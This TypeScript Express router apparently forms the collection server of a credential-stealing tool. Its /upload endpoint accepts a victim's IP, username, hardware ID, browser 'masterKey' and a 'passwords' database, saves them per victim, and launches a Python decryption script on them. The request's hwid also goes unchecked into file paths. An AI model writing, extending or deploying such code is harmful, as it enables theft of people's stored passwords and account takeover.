import express from "express";
import fs from "fs";
import child_process from "child_process";

const router: express.Router = express.Router();

interface UploadData {
  masterKey: string;
  ip: string;
  username: string;
  hwid: string;
}

router.post("/upload", (req: express.Request, res: express.Response) => {
  const uploadData: UploadData = req.body;
  const object = {
    ip: uploadData.ip,
    hwid: uploadData.hwid,
    username: uploadData.username,
    masterKey: uploadData.masterKey,
  };
  const date: Date = new Date();
  const fileName: string = `${date.getMonth() + 1}-${date.getDay() + 1}-${
    date.getHours() + 1
  }`;

  if (!fs.existsSync(`./storage/${uploadData.hwid}`)) {
    fs.mkdir(`./storage/${uploadData.hwid}`, function (err) {
      if (err) console.log(err);
    });
  }

  fs.writeFile(
    `./storage/${uploadData.hwid}/passwords-${fileName}.db`,
    // @ts-expect-error
    req.files[0].buffer,
    function (err) {
      if (err) console.log(err);

      if (!err) {
        fs.writeFile(
          `./storage/${uploadData.hwid}/data.json`,
          JSON.stringify(object),
          function (err) {
            if (err) console.log(err);

            const spawn = child_process.spawn;
            const process = spawn("python", ["./decrypt.py", uploadData.hwid]);

            /*  dev
             * process.stdout.on("data", function (data) {
             *     console.log(data.toString());
             *   });
             */
          }
        );
      }
    }
  );

  res.sendStatus(200);
});

export { router };
